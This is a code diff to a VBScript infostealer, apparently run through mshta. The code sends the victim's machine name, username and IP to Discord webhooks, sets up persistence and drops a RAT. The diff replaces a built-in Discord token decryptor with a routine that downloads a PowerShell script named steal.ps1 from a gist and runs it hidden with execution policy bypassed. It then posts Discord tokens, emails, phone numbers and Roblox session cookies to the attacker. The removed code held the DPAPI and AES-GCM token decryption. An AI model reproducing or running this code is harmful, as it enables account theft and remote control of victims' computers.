@@ -21,7 +21,10 @@ lastCookie = ""
 ' --- 1. INITIAL (WH ONLY) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
-Call GrabTokensNative(WH)
+
+' This grabs tokens, waits for PS1 to finish, reads the file, posts tokens/cookies
+Call GrabTokens(WH)
+
 Call Persistence
 Call PostCookieOnly(WH)
 Call DropRAT(WH)
@@ -32,67 +35,93 @@ runCount = 0
 Do
     runCount = runCount + 1
     Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
-    Call GrabTokensNative(RE_WH)
+    Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     Call SleepSeconds(30)
-    Exit Do ' Stops the loop so it doesn't spam
+    Exit Do ' Stops the loop from spamming
 Loop
 
 window.close()
 
-' --- NATIVE TOKEN GRABBER ---
-Sub GrabTokensNative(targetWH)
-    Dim appdata, paths, i, filePath, raw, mk, startPos, endPos, b64, token
-    appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
+' --- GRAB TOKENS VIA PS1 ---
+Sub GrabTokens(targetWH)
+    Dim xh, pc, psf, tf, cp, raw, lines, l
+    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
     
-    Dim lsPath : lsPath = appdata & "\discord\Local State"
-    If fso.FileExists(lsPath) Then
-        raw = ReadFile(lsPath)
-        startPos = InStr(raw, """encrypted_key"":""") + 17
-        If startPos > 17 Then
-            endPos = InStr(startPos, raw, """")
-            b64 = Mid(raw, startPos, endPos - startPos)
-            mk = DecryptDPAPI(b64)
-            If Len(mk) > 5 Then mk = Mid(mk, 6)
-        End If
-    End If
+    ' Use your PS1 link
+    xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/4eac95e5238b7dce163f6d360e902605050d1954/steal.ps1", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    pc = xh.responseText
+    Set xh = Nothing
+    
+    psf = TmpFile("steal.ps1")
+    WriteFile psf, pc
 
-    If Len(mk) > 0 Then
-        paths = Array(appdata & "\discord\Local Storage\leveldb", appdata & "\discordptb\Local Storage\leveldb", appdata & "\discordcanary\Local Storage\leveldb")
-        For i = 0 To UBound(paths)
-            If fso.FolderExists(paths(i)) Then
-                Dim folder, f
-                Set folder = fso.GetFolder(paths(i))
-                For Each f In folder.Files
-                    If Right(f.Name, 4) = ".ldb" Or Right(f.Name, 4) = ".log" Then
-                        raw = ReadFile(f.Path)
-                        startPos = 1
-                        Do
-                            startPos = InStr(startPos, raw, "dQw4w9WgXcQ:")
-                            If startPos = 0 Then Exit Do
-                            startPos = startPos + 12
-                            endPos = startPos
-                            Do
-                                Dim char : char = Mid(raw, endPos, 1)
-                                If char = """" Or char = "\" Or Asc(char) < 32 Then Exit Do
-                                endPos = endPos + 1
-                                If endPos - startPos > 200 Then Exit Do
-                            Loop
-                            b64 = Mid(raw, startPos, endPos - startPos)
-                            If Len(b64) > 40 Then
-                                token = DecryptGCM(mk, b64)
-                                If Len(token) > 30 Then Call PostEmbedTo(":gift: Discord Token", "**Token:** " & token, 10181046, targetWH)
-                            End If
-                        Loop
-                    End If
-                Next
+    tf = TmpFile("steal_result.txt")
+    fso.DeleteFile tf, True
+
+    ' Run the PS1 in background
+    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
+
+    ' BLOCKING WAIT: Poll for the file up to 60 seconds so mshta doesn't crash/close early
+    Dim waited : waited = 0
+    Dim sz : sz = 0
+    Do
+        Call SleepSeconds(2)
+        waited = waited + 2
+        If fso.FileExists(tf) Then
+            On Error Resume Next
+            sz = fso.GetFile(tf).Size
+            On Error GoTo 0
+            If sz > 10 Then Exit Do ' File has content, break wait
+        End If
+    Loop While waited < 60
+
+    If Not fso.FileExists(tf) Then Exit Sub
+
+    ' Copy and read
+    cp = TmpFile("sr_" & Int(Rnd()*99999) & ".txt")
+    On Error Resume Next
+    fso.CopyFile tf, cp, True
+    On Error GoTo 0
+    If Not fso.FileExists(cp) Then cp = tf
+
+    raw = ReadFile(cp)
+    If cp <> tf Then fso.DeleteFile cp, True
+    If Len(raw) < 10 Then Exit Sub
+
+    ' Strip BOM and fix line endings
+    If Asc(Left(raw, 1)) = 239 Then raw = Mid(raw, 4)
+    raw = Replace(raw, vbCrLf, vbLf)
+    raw = Replace(raw, vbCr, vbLf)
+
+    lines = Split(raw, vbLf)
+    For Each l In lines
+        l = Trim(l)
+        If Left(l, 8) = "DISCORD|" Then
+            Dim p: p = Split(Mid(l, 9), "|")
+            If UBound(p) >= 4 Then
+                Dim info: info = "**User:** " & p(0) & vbCrLf
+                If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
+                If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
+                If p(3) <> "" And p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
+                info = info & "**Token:** " & p(4)
+                Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
             End If
-        Next
-    End If
+        ElseIf Left(l, 9) = "ROBLOXMS|" Then
+            Dim c1: c1 = Mid(l, 10)
+            If Len(c1) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie (MS)", "Size: " & Len(c1) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c1 & "``", 10181046, targetWH)
+        ElseIf Left(l, 8) = "ROBLOX|" Then
+            Dim c2: c2 = Mid(l, 9)
+            If Len(c2) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c2) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c2 & "``", 10181046, targetWH)
+        End If
+    Next
 End Sub
 
-' --- NATIVE ROBLOX COOKIE ---
+' --- NATIVE ROBLOX COOKIE (Backup) ---
 Sub PostCookieOnly(targetWH)
     Dim cookie : cookie = GetRobloxCookie()
     If Len(cookie) < 20 Then Exit Sub
@@ -117,20 +146,6 @@ Function GetRobloxCookie()
     For i = 0 To 4
         If fso.FileExists(checkPaths(i)) Then fp = checkPaths(i) : Exit For
     Next
-    
-    If Len(fp) = 0 Then
-        Dim pk: pk = l & "\Packages"
-        If fso.FolderExists(pk) Then
-            Dim folder, subf
-            Set folder = fso.GetFolder(pk)
-            For Each subf In folder.SubFolders
-                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
-                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp : Exit For
-                End If
-            Next
-        End If
-    End If
     
     If Len(fp) = 0 Then Exit Function
     raw = ReadFile(fp)
@@ -263,35 +278,6 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile psf, True
     fso.DeleteFile outf, True
     On Error GoTo 0
-End Function
-
-Function DecryptGCM(key, b64)
-    DecryptGCM = ""
-    Dim inf: inf = TmpFile("gcm.txt")
-    Dim outf: outf = TmpFile("gcm_out.txt")
-    On Error Resume Next
-    fso.DeleteFile outf, True
-    WriteFile inf, b64
-    Dim ps: ps = "try{$k=[Convert]::FromBase64String('" & Base64Encode(key) & "');$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$n=$b[3..14];$c=$b[15..($b.Length-17)];$aes=[System.Security.Cryptography.Aes]::Create();$aes.Key=$k;$aes.Mode='ECB';$aes.Padding='None';$e=$aes.CreateEncryptor();$o=New-Object byte[] $c.Length;$cb=New-Object byte[] 16;$n.CopyTo($cb,0);$cb[15]=2;for($i=0;$i -lt $c.Length;$i+=16){$kk=$e.TransformFinalBlock($cb,0,16);for($j=0;$j -lt [Math]::Min(16,$c.Length-$i);$j++){$o[$i+$j]=$c[$i+$j] -bxor $kk[$j]};for($j=15;$j -ge 12;$j--){$cb[$j]++;if($cb[$j] -ne 0){break}}};[Text.Encoding]::UTF8.GetString($o)|Out-File '" & outf & "' -Encoding ascii}catch{}"
-    Dim psf: psf = TmpFile("gcm.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
-    If fso.FileExists(outf) Then DecryptGCM = ReadFile(outf)
-    fso.DeleteFile inf, True
-    fso.DeleteFile psf, True
-    fso.DeleteFile outf, True
-    On Error GoTo 0
-End Function
-
-Function Base64Encode(str)
-    Dim xml, node
-    Set xml = CreateObject("MSXML2.DOMDocument")
-    Set node = xml.createElement("b64")
-    node.dataType = "bin.base64"
-    node.nodeTypedValue = str
-    Base64Encode = node.text
-    Set node = Nothing
-    Set xml = Nothing
 End Function
 
 Sub PostEmbed(t, d, c)
